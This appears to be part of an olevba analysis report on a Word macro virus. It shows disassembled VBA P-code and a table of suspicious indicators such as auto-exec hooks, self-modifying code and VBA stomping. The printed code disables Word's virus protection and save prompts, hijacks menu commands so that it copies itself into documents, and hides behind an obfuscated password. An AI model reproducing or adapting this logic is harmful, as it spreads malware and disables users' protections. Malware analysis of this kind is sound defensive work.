' 	FuncDefn (Sub fileNewDefault())
' Line #223:
' 	ArgsCall AnimateCaption 0x0000 
' Line #224:
' 	Ld WordBasic 
' 	ArgsMemCall fileNewDefault 0x0000 
' Line #225:
' 	ArgsCall Copy2Document 0x0000 
' Line #226:
' 	EndSub 
' Line #227:
' Line #228:
' 	FuncDefn (Sub FileNew())
' Line #229:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #230:
' 	ArgsCall AnimateCaption 0x0000 
' Line #231:
' 	ArgsCall Copy2Document 0x0000 
' Line #232:
' 	EndIfBlock 
' Line #233:
' 	EndSub 
' Line #234:
' Line #235:
' 	FuncDefn (Sub Stealth())
' Line #236:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #237:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #238:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' Line #239:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #240:
' 	EndWith 
' Line #241:
' 	EndSub 
' Line #242:
' Line #243:
' 	FuncDefn (Sub NoStealth())
' Line #244:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #245:
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' Line #246:
' 	LitVarSpecial (True)
' 	MemStWith SavePropertiesPrompt 
' Line #247:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #248:
' 	EndWith 
' Line #249:
' 	EndSub 
' Line #250:
' Line #251:
' 	FuncDefn (Sub ToolsOptions())
' Line #252:
' 	ArgsCall InitDialog 0x0000 
' Line #253:
' 	ArgsCall NoStealth 0x0000 
' Line #254:
' 	OnError (Resume Next) 
' Line #255:
' 	Ld ToolsOptionsDlg 
' 	ArgsMemCall Display 0x0000 
' Line #256:
' 	ArgsCall AnimateCaption 0x0000 
' Line #257:
' 	ArgsCall Stealth 0x0000 
' Line #258:
' 	EndSub 
' Line #259:
' Line #260:
' Line #261:
' 	FuncDefn (Sub NoAccess())
' Line #262:
' 	Ld msg 
' 	Ld vbExclamation 
' 	Ld abadacc 
' 	ArgsLd MsgBox 0x0003 
' 	St a 
' Line #263:
' 	ArgsCall AnimateCaption 0x0000 
' Line #264:
' 	EndSub 
' Line #265:
' Line #266:
' 	FuncDefn (Function passDialog() As Boolean)
' Line #267:
' 	Dim 
' 	VarDefn cruel (As String)
' Line #268:
' 	LitVarSpecial (False)
' 	St passDialog 
' Line #269:
' 	Ld code 
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld ddd 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	Ld ddd 
' 	LitDI2 0x0003 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	Ld ccc 
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	Ld ddd 
' 	LitDI2 0x0006 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	Ld code 
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St cruel 
' Line #270:
' 	Ld pass 
' 	Ld badboy 
' 	ArgsLd InputBox 0x0002 
' 	ArgsLd LCase 0x0001 
' 	Ld cruel 
' 	Eq 
' 	IfBlock 
' Line #271:
' 	LitVarSpecial (True)
' 	St passDialog 
' Line #272:
' 	ElseBlock 
' Line #273:
' 	ArgsCall NoAccess 0x0000 
' Line #274:
' 	EndIfBlock 
' Line #275:
' 	EndFunc 
' Line #276:
' Line #277:
' Line #278:
' 	FuncDefn (Sub ToolsMacro())
' Line #279:
' 	ArgsCall InitDialog 0x0000 
' Line #280:
' 	Ld ToolsMacrosDlg 
' 	ArgsMemCall Display 0x0000 
' Line #281:
' 	ArgsCall AnimateCaption 0x0000 
' Line #282:
' 	EndSub 
' Line #283:
' Line #284:
' Line #285:
' 	FuncDefn (Sub FileTemplates())
' Line #286:
' 	ArgsCall InitDialog 0x0000 
' Line #287:
' 	Ld ToolsTemplatesDlg 
' 	ArgsMemCall Display 0x0000 
' Line #288:
' 	QuoteRem 0x0000 0x0029 "    CustomizationContext = NormalTemplate"
' Line #289:
' 	ArgsCall AnimateCaption 0x0000 
' Line #290:
' 	EndSub 
' Line #291:
' Line #292:
' 	FuncDefn (Sub viewvbcode())
' Line #293:
' 	Ld passDialog 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #294:
' 	EndSub 
' Line #295:
' Line #296:
' 	FuncDefn (Sub viewcode())
' Line #297:
' 	ArgsCall viewvbcode 0x0000 
' Line #298:
' 	EndSub 
' Line #299:
' Line #300:
' 	FuncDefn (Sub Organizer())
' Line #301:
' 	ArgsCall InitDialog 0x0000 
' Line #302:
' 	Ld OrganizerDlg 
' 	ArgsMemCall Display 0x0000 
' Line #303:
' 	ArgsCall AnimateCaption 0x0000 
' Line #304:
' 	EndSub 
' Line #305:
' Line #306:
' 	FuncDefn (Sub FormatStyle())
' Line #307:
' 	ArgsCall InitDialog 0x0000 
' Line #308:
' 	StartWithExpr 
' 	Ld FormatStyleDlg 
' 	With 
' Line #309:
' 	ArgsMemCallWith Display 0x0000 
' Line #310:
' 	ArgsMemCallWith Execute 0x0000 
' Line #311:
' 	EndWith 
' Line #312:
' 	ArgsCall AnimateCaption 0x0000 
' Line #313:
' 	EndSub 
' Line #314:
' Line #315:
' Line #316:
' 	FuncDefn (Sub ModifyAttr(fileName As String))
' Line #317:
' 	OnError (Resume Next) 
' Line #318:
' 	Ld fileName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbArchive 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld fileName 
' 	Ld vbArchive 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #319:
' 	EndSub 
' Line #320:
' Line #321:
' 	FuncDefn (Sub AnimateCaption())
' Line #322:
' 	OnError (Resume Next) 
' Line #323:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld WordBasic 
' 	ArgsMemCall viewpage 0x0000 
' 	EndIf 
' Line #324:
' 	Ld Animated 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #325:
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	St anIntv 
' Line #326:
' 	LitDI2 0x0000 
' 	St anPos 
' Line #327:
' 	Ld YOS 
' 	St anCap 
' Line #328:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #329:
' 	LitVarSpecial (True)
' 	St Animated 
' Line #330:
' 	EndSub 
' Line #331:
' Line #332:
' Line #333:
' 	FuncDefn (Sub ScrollCaption())
' Line #334:
' 	Ld Animated 
' 	IfBlock 
' Line #335:
' 	Ld anCap 
' 	Ld anPos 
' 	ArgsLd Right$ 0x0002 
' 	Ld Application 
' 	MemSt Caption 
' Line #336:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld anIntv 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #337:
' 	Ld anPos 
' 	LitDI2 0x0001 
' 	Add 
' 	St anPos 
' Line #338:
' 	EndIfBlock 
' Line #339:
' Line #340:
' 	Ld anPos 
' 	Ld anCap 
' 	FnLen 
' 	Gt 
' 	IfBlock 
' Line #341:
' 	OnError (Resume Next) 
' Line #342:
' 	Ld WordBasic 
' 	ArgsMemCall viewpage 0x0000 
' Line #343:
' Line #344:
' 	LitDI2 0x0000 
' 	St anPos 
' Line #345:
' 	Ld anCap 
' 	Ld YOS 
' 	Eq 
' 	IfBlock 
' Line #346:
' 	Ld Peace 
' 	St anCap 
' Line #347:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0005 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #348:
' 	LitVarSpecial (True)
' 	St Animated 
' Line #349:
' 	Ld anCap 
' 	Ld Peace 
' 	Eq 
' 	ElseIfBlock 
' Line #350:
' 	Ld mw 
' 	St anCap 
' Line #351:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0005 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #352:
' 	LitVarSpecial (True)
' 	St Animated 
' Line #353:
' 	Ld anCap 
' 	Ld mw 
' 	Eq 
' 	ElseIfBlock 
' Line #354:
' 	Ld YOS 
' 	St anCap 
' Line #355:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x04B0 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #356:
' 	LitVarSpecial (False)
' 	St Animated 
' Line #357:
' 	EndIfBlock 
' Line #358:
' 	EndIfBlock 
' Line #359:
' 	EndSub 
' Line #360:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

